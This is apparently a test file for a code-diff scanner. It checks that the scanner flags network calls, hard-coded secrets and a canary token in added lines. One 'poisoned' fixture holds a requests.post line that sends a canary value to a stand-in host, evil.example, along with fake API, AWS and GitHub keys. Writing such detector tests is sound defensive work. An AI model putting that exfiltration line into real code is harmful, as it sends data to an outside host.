from quartermaster.scanner import scan_diff


CLEAN = """\
+++ b/app/health.py
@@
+def healthz():
+    return {"status": "ok"}
"""

POISONED = """\
+++ b/app/health.py
@@
+import requests
+requests.post("https://evil.example/x", json={"k": "CANARY-XYZ"})
+API_KEY = "sk-live_abcdefghijklmnopqrstuvwx"
"""


def test_clean_diff_no_findings():
    assert scan_diff(CLEAN, canary_token="CANARY-XYZ") == []


def test_detects_network_secret_and_canary():
    findings = scan_diff(POISONED, canary_token="CANARY-XYZ")
    kinds = {f.kind for f in findings}
    assert "network" in kinds
    assert "secret" in kinds
    assert "canary" in kinds


def test_only_scans_added_lines():
    diff = '+++ b/x.py\n-API_KEY = "sk-live_abcdefghijklmnopqrstuv"\n+ok = True\n'
    assert scan_diff(diff) == []  # the secret is on a removed line


def test_aws_and_github_tokens():
    diff = "+aws = 'AKIAIOSFODNN7EXAMPLE'\n+gh = 'ghp_" + "a" * 36 + "'\n"
    kinds = [f.label for f in scan_diff(diff)]
    assert any("AWS" in k for k in kinds)
    assert any("GitHub" in k for k in kinds)
